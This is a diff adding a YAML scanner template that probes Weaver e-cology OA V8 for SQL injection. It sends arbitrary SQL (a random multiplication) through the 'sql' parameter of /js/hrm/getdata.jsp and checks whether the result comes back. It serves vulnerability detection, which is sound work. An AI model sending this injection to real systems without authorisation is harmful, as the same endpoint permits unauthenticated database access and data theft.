@@ -1,0 +1,15 @@
+name: poc-yaml-ecology-v8-sqli
+set:
+  r1: randomInt(1000, 9999)
+  r2: randomInt(1000, 9999)
+rules:
+  - method: GET
+    path: /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+{{r1}}*{{r2}}+as+id
+    follow_redirects: false
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(r1 * r2)))
+
+detail:
+  author: Print1n(http://print1n.top)
+  links:
+    - http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
